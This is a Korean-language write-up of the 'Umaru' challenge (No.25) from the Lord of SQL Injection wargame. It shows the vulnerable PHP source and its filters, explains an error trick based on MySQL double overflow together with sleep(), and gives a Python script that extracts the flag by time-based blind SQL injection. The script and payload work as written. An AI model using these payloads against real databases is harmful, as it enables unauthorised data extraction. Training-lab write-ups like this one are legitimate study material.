# Lord of SQL Injection No.25 - Umaru
## 문제 출제 의도
Time Based SQL Injection의 이해 여부를 확인한다.
## 소스 코드 분석
+ 소스코드
~~~
    <?php
    include "./config.php";
    login_chk();
    dbconnect();

    function reset_flag(){
        $new_flag = substr(md5(rand(10000000,99999999)."qwer".rand(10000000,99999999)."asdf".rand(10000000,99999999)),8,16);
        $chk = @mysql_fetch_array(mysql_query("select id from prob_umaru where id='{$_SESSION[los_id]}'"));
        if(!$chk[id]) mysql_query("insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')");
        else mysql_query("update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'");
        echo "reset ok";
        highlight_file(__FILE__);
        exit();
    }

    if(!$_GET[flag]){ highlight_file(__FILE__); exit; }

    if(preg_match('/prob|_|\./i', $_GET[flag])) exit("No Hack ~_~");
    if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit("HeHe");
    if(strlen($_GET[flag])>100) exit("HeHe");

    $realflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru where id='{$_SESSION[los_id]}'"));

    @mysql_query("create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'");
    @mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");

    $tempflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru_temp"));
    if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();

    if($realflag[flag] === $_GET[flag]) solve("umaru");
    ?>
~~~

+ 소스 코드 분석
    - 금지 문자, 문자열
        * GET 방식으로 받은 flag값에 'prob _ . 중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
        * GET방식으로 받은 flag값에 "id", "where","order","limit",',' 중 하나라도 있다면 "HeHe"가 출력되고 문제풀이에 실패한다.
        * 또한, flag의 길이가 100자 초과이면 "HeHe"가 출력되고 문제 풀이에 실패한다.

    - 사용자 정의 함수 reset_flag()
        * reset_flag는 prob_umaru 테이블에 사용자 세션 아이디 id, 새로운 랜덤 값 flag 레코드를 추가 또는 초기화 하는 함수이다.

    - 풀이 성공 조건
        * 데이터베이스에서 받은 기존의 flag값과 GET방식으로 전달받은 flag값이 정확히 같아야 한다.
## 문제 해결
- Mysql 지수 연산 최대치 이용
    + MySQL에서는 e를 이용한 지수 연산이 가능하다.
    ~~~
    >>> 9e0
    9.0
    >>> 9e1
    90.0
    >>>9e10
    90000000000.0
    ~~~
    + 지수 연산의 최대치는 9e307이다.
    + 9e308부터는 ERROR 1367 (22007): Illegal double '9e308' value found during parsing 와 같이 에러가 난다.
    + 이를 이용하여 9e307*2등을 이용해 에러를 유도 할 수 있다.
- sleep()
    + 파라미터의 초만큼 일시 정지하는 함수다.
    + 정상적으로 실행되면 0을 그렇지 않다면 1을 반환한다.
- pw 값
    + pw의 값은 다음과 같은 코드를 이용하여 알아낼 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote
    import time

    url = "http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag="
    key = ""
    len=16

    for i in range(1, len+1):
        for j in range(48, 127):
            data = "(case(substr(flag from {} for 1)) when '{}' then ((sleep(4)+2)*9e307) else 9e307*2 end)".format(str(i), chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
            re.add_header("Cookie", "PHPSESSID=tb8r272e7i0jfhbeb522klmbm0")
            st = time.time()
            res = urllib.request.urlopen(re)
            et = time.time()

            if et-st > 4:
                key += chr(j).lower()
                print (key)
                break
    print (key)
    ~~~
    + 이를 이용하면 각자에게 맞는 pw 값이 출력된다.
    + 이를 GET 방식으로 입력하면 문제가 해결된다.